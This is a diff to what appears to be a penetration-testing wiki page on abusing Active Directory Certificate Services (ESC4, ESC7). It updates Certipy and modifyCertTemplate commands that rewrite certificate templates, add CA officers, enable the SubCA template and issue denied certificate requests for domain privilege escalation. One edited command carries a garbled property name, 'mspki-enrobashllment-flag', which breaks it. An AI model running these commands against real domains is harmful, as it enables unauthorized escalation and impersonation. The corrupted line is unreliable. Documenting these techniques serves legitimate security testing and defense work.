@@ -48,35 +48,29 @@ In order to obtain an abusable template, some attributes and parameters need to 
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries, and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries ([how to enumerate](./#attack-paths)), and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.
 
-```python
-# 1. Enumerate sensitive access control entries
-certipy find 'domain.local'/'user':'password'@'domaincontroller'
+```bash
+# 1. Overwrite the certificate template and save the old configuration
+certipy template -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -template templateName -save-old
 
-# 2. Overwrite the certificate template and save the old configuration
-certipy template 'domain.local'/'user':'password'@'ca_server' -template templateName -save-old
-
-# 3. After the ESC1 attack, restore the original configuration
-certipy template 'domain.local'/'user':'password'@'ca_serverca_server' -template templateName -configuration 'templateName.json'
+# 2. After the ESC1 attack, restore the original configuration
+certipy template -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -template templateName -configuration 'templateName.json'
 ```
 
 If a more precise template modification is needed, [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify each attributes of the template.
 
-```python
-# 1. Enumerate sensitive access control entries
-certipy find 'domain.local'/'user':'password'@'domaincontroller'
+```bash
+# 1. Disable Manager Approval Requirement
+modifyCertTemplate.py -template templateName -value 2 -property mspki-enrobashllment-flag domain.local/user:password
 
-# 2. Disable Manager Approval Requirement
-modifyCertTemplate.py -template templateName -value 2 -property mspki-enrollment-flag domain.local/user:password
-
-# 3. Disable Authorized Signature Requirement
+# 2. Disable Authorized Signature Requirement
 modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature domain.local/user:password
 
-# 4. Enable SAN Specification
+# 3. Enable SAN Specification
 modifyCertTemplate.py -template templateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag domain.local/user:password
 
-# 5. Edit Certificate Application Policy Extension
+# 4. Edit Certificate Application Policy Extension
 modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy domain.local/user:password
 ```
 
@@ -143,20 +137,17 @@ This ID can be used by a user with the **ManageCA** _and_ **ManageCertificates**
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object and modify some CA's attributes like the officiers list (an officier is a user with the **ManageCertificate** rights) or the enabled certificate templates.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object ([how to enumerate](./#attack-paths)) and modify some CA's attributes like the officiers list (an officier is a user with the **ManageCertificate** rights) or the enabled certificate templates.
 
-```python
-# Enumerate sensitive access rights
-certipy find 'domain.local'/'user':'password'@'domain_controller'
-
+```bash
 # Add a new officier
-certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -add-officier 'user'
+certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -add-officier 'user'
 
 # List all the templates
-certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -list-templates
+certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -list-templates
 
 # Enable a certificate template
-certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -enable-template 'SubCA'
+certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -ca 'ca_name' -enable-template 'SubCA'
 ```
 
 {% hint style="info" %}
@@ -201,17 +192,14 @@ DISM.exe /Online /add-capability /CapabilityName:Rsat.CertificateServices.Tools~
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object. Coupled with the **ManageCA** right, it is possible to issue a certificate from a failed request.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object ([how to enumerate](./#attack-paths)). Coupled with the **ManageCA** right, it is possible to issue a certificate from a failed request.
 
-```python
-# Enumerate sensitive access rights
-certipy find 'domain.local'/'user':'password'@'domain_controller'
-
+```bash
 # Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
-certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -issue-request 100
+certipy ca -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -issue-request 100
 
 # Retrieve an issued certificate
-certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -request 100
+certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -retrieve 100
 ```
 
 The certificate can then be used with [Pass-The-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
@@ -260,8 +248,6 @@ Currently, the best resources for manually abusing this are&#x20;
 ### Other objects (ESC5)
 
 This can be enumerated and abused like regular AD access control abuses. Once control over an AD-CS-related is gained, creativity will be the attacker's best ally.
-
-
 
 {% content-ref url="../dacl/" %}
 [dacl](../dacl/)
